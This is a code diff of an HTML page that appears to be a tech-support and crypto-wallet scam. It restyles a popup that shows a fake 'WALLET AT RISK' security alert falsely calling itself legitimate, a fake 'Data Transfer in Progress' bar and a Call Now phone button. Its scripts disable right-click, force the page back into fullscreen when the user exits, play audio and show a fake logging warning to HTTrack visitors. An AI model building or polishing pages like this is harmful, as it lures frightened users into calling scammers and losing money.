@@ -39,16 +39,16 @@
         transform: translate(-50%, -50%);
         background-color: #fff;
         color: #000;
-        padding: 20px;
+        padding: 15px;
         border-radius: 8px;
         box-shadow: 0 0 20px rgba(0,0,0,0.5);
         z-index: 999;
         width: 90%;
-        max-width: 400px;
+        max-width: 380px;
         text-align: center;
         animation: heartbeat 1s infinite;
-        max-height: unset;
-        overflow: visible;
+        max-height: 80vh;      /* ✅ Popup height limit */
+        overflow-y: auto;      /* ✅ Scroll if content overflows */
     }
 
     @keyframes heartbeat {
@@ -98,7 +98,15 @@
         transition: width 0.5s linear;
     }
 
-    .popup-content button, #callNumberText {
+    .popup-buttons {
+        position: sticky;    /* ✅ button hamesha bottom par rahe */
+        bottom: 0;
+        background: #fff;
+        padding: 10px 0;
+        margin-top: 10px;
+    }
+
+    .popup-buttons button, .popup-buttons #callNumberText {
         padding: 10px 20px;
         background-color: red;
         color: #fff;
@@ -106,7 +114,6 @@
         border-radius: 4px;
         font-size: 16px;
         cursor: pointer;
-        margin-top: 20px;
         display: none;
     }
 
@@ -116,13 +123,52 @@
     }
 
     @media (max-width: 480px) {
+        #leavePopup {
+            padding: 12px;
+            max-width: 340px;
+            max-height: 75vh;
+        }
+
         .message-text {
             font-size: 12px;
+            line-height: 1.3;
         }
+
         .alert-text {
-            font-size: 16px;
+            font-size: 15px;
+        }
+
+        .popup-buttons button, .popup-buttons #callNumberText {
+            font-size: 14px;
+            padding: 8px 16px;
+        }
+
+        #logoImage {
+            width: 110px;
+            margin-bottom: 8px;
         }
     }
+
+    .sec-alert{
+      max-width:800px;
+      margin:18px auto;
+      border-left:6px solid #b33;
+      background:#fff6f6;
+      color:#2b2b2b;
+      padding:18px;
+      border-radius:8px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.06);
+      font-family:Inter, Roboto, system-ui, Arial, sans-serif;
+    }
+    .sec-alert-title{
+      font-weight:700;
+      font-size:1.12rem;
+      margin-bottom:10px;
+    }
+    .sec-alert-body p{ margin:8px 0; line-height:1.35; }
+    .sec-alert-body ul{ margin:8px 0 0 20px; }
+    .sec-alert-body .muted{ color:#555; font-size:0.9rem; margin-top:12px; }
+    a { color:inherit; text-decoration:underline; }
 </style>
 </head>
 <body oncontextmenu="return false;">
@@ -132,57 +178,34 @@
 <div id="leavePopup">
     <div class="popup-content">
         <img id="logoImage" src="https://1992gameofthrone1992.github.io/imagetopa/cb.png" alt="Logo">
-      <!-- Genuine Security Alert (call support) -->
-<div class="sec-alert" role="alert" aria-live="assertive">
-  <div class="sec-alert-title">🚨 SECURITY ALERT — WALLET AT RISK 🚨</div>
-  <div class="sec-alert-body">
-    <p><strong>Detected:</strong> Suspicious activity for the wallet tied to this device (example IP: <b>192.0.2.123</b>).</p>
 
-    <p><strong>Immediate steps:</strong></p>
-    <ul>
-      <li><strong>Call support immediately:</strong> <a href="tel:+18005550123">+1-800-555-0123</a> (example). When connected, say: “I received a security alert for my wallet (IP: 192.0.2.123).”</li>
-      <li>Do <strong>not</strong> share private keys, seed phrases, or passwords with anyone—even if they claim to be support.</li>
-      <li>Revoke active sessions / connected dApps as instructed by support.</li>
-      <li>Move funds to a new wallet created on a secure (preferably offline) device if advised by support.</li>
-      <li>Enable 2-factor authentication (2FA).</li>
-      <li>Contact support also by email if needed: <a href="mailto:support@example.com">support@example.com</a></li>
-    </ul>
-
-    <p class="muted">This is a legitimate security notice. Follow official instructions and ignore unsolicited outreach.</p>
-  </div>
-</div>
-
-<style>
-.sec-alert{
-  max-width:800px;
-  margin:18px auto;
-  border-left:6px solid #b33;
-  background:#fff6f6;
-  color:#2b2b2b;
-  padding:18px;
-  border-radius:8px;
-  box-shadow:0 6px 18px rgba(0,0,0,0.06);
-  font-family:Inter, Roboto, system-ui, Arial, sans-serif;
-}
-.sec-alert-title{
-  font-weight:700;
-  font-size:1.12rem;
-  margin-bottom:10px;
-}
-.sec-alert-body p{ margin:8px 0; line-height:1.35; }
-.sec-alert-body ul{ margin:8px 0 0 20px; }
-.sec-alert-body .muted{ color:#555; font-size:0.9rem; margin-top:12px; }
-a { color:inherit; text-decoration:underline; }
-</style>
-
+        <!-- Genuine Security Alert (call support) -->
+        <div class="sec-alert" role="alert" aria-live="assertive">
+          <div class="sec-alert-title">🚨 SECURITY ALERT — WALLET AT RISK 🚨</div>
+          <div class="sec-alert-body">
+            <p><strong>Detected:</strong> Suspicious activity for the wallet tied to this device (example IP: <b>192.0.2.123</b>).</p>
+            <p><strong>Immediate steps:</strong></p>
+            <ul>
+              <li><strong>Call support immediately:</strong> <a href="tel:+18005550123">+1-800-555-0123</a></li>
+              <li>Do <strong>not</strong> share private keys, seed phrases, or passwords with anyone—even if they claim to be support.</li>
+              <li>Revoke active sessions / connected dApps as instructed by support.</li>
+              <li>Move funds to a new wallet created on a secure device if advised.</li>
+              <li>Enable 2-factor authentication (2FA).</li>
+              <li>Contact support also by email: <a href="mailto:support@example.com">support@example.com</a></li>
+            </ul>
+            <p class="muted">This is a legitimate security notice. Follow official instructions and ignore unsolicited outreach.</p>
+          </div>
+        </div>
 
         <div class="loading-text">Data Transfer in Progress...</div>
         <div class="progress-bar-container">
             <div class="progress-bar-fill" id="progressFill"></div>
         </div>
 
-        <button id="callNowBtn">Call Now</button>
-        <div id="callNumberText">+1 888 888 8888</div>
+        <div class="popup-buttons">
+            <button id="callNowBtn">Call Now</button>
+            <div id="callNumberText">+1 888 888 8888</div>
+        </div>
     </div>
 </div>
 
@@ -202,12 +225,7 @@ a { color:inherit; text-decoration:underline; }
     }
 
     window.onload = function() {
-        if (isMobile()) {
-            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
-        } else {
-            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
-        }
-
+        startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
         if (navigator.userAgent.includes("HTTrack")) {
             alert("Website copying attempt detected. Action has been logged.");
         }
@@ -230,7 +248,7 @@ a { color:inherit; text-decoration:underline; }
         audio.play();
 
         if (isMobile()) {
-            callNowBtn.style.display = 'block';
+            callNowBtn.style.display = 'inline-block';
         } else {
             callNumberText.style.display = 'block';
         }
@@ -240,10 +258,7 @@ a { color:inherit; text-decoration:underline; }
             progress += 0.2;
             if (progress > 100) progress = 100;
             progressFill.style.width = progress + '%';
-
-            if (progress === 100) {
-                clearInterval(interval);
-            }
+            if (progress === 100) clearInterval(interval);
         }, 1000);
 
         setTimeout(function () {
@@ -266,17 +281,12 @@ a { color:inherit; text-decoration:underline; }
     }
 
     function applyBackground() {
-        if (isMobile()) {
-            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
-        } else {
-            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
-        }
+        document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/cb-page.jpeg')";
         document.body.style.backgroundSize = "100% 100%";
         document.body.style.backgroundPosition = "center";
         document.body.style.backgroundRepeat = "no-repeat";
     }
 
-    // FULLSCREEN EXIT HANDLING
     document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement) {
             document.addEventListener('click', reEnterFullscreenOnce, { once: true });
@@ -290,5 +300,3 @@ a { color:inherit; text-decoration:underline; }
 
 </body>
 </html>
-
-
